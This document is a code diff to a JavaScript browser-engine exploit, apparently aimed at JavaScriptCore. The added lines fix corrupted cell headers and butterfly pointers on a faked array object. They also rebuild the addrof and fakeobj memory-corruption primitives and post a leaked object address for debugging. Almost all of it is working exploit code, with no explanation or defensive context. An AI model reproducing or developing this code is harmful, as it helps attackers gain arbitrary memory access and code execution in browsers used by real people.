@@ -526,6 +526,7 @@ var VM_PROT_EXECUTE = 0x4
               b1[0] = val;
               return new Int64.fromDouble(a1[0]);
             }
+            port.postMessage("debug addrof of {}" + addrof({}))
             //port.postMessage("obj addr@ " + addrof(""))
               //gc();
             /*var rw = {
@@ -575,6 +576,27 @@ var VM_PROT_EXECUTE = 0x4
     port.postMessage("[+] container @ "+ containerAddr.toString());
     // add the offset to let compiler recognize fake structure
     var hax = fakeobj(Add(containerAddr,new Int64(0x10)));
+     // fix broken cell header
+            fakeArr[0] = bigint2float(doubleArrayCellHeader);
+            // grab a real butterfly pointer
+            let doubleArrayButterfly = float2bigint(fakeArr[1]);
+            // fix other broken cell header
+            obj.fakeButterfly = b0;
+            fakeArr[0] = bigint2float(doubleArrayCellHeader);
+            // fix the broken butterflys and setup cleaner addrof / fakeobj
+            obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
+            obj.fakeButterfly = a1;
+            fakeArr[1] = bigint2float(doubleArrayButterfly);
+            obj.fakeButterfly = b1;
+            fakeArr[1] = bigint2float(doubleArrayButterfly);
+            fakeobj = (addr) => {
+              a1[0] = new Int64(addr).asDouble();
+              return b1[0];
+            }
+            addrof = (val) => {
+              b1[0] = val;
+              return new Int64.fromDouble(a1[0]);
+            }
     /*var maxtry = 0;
     if (hax instanceof Array) {
             print("got fakeobj with real struct id");
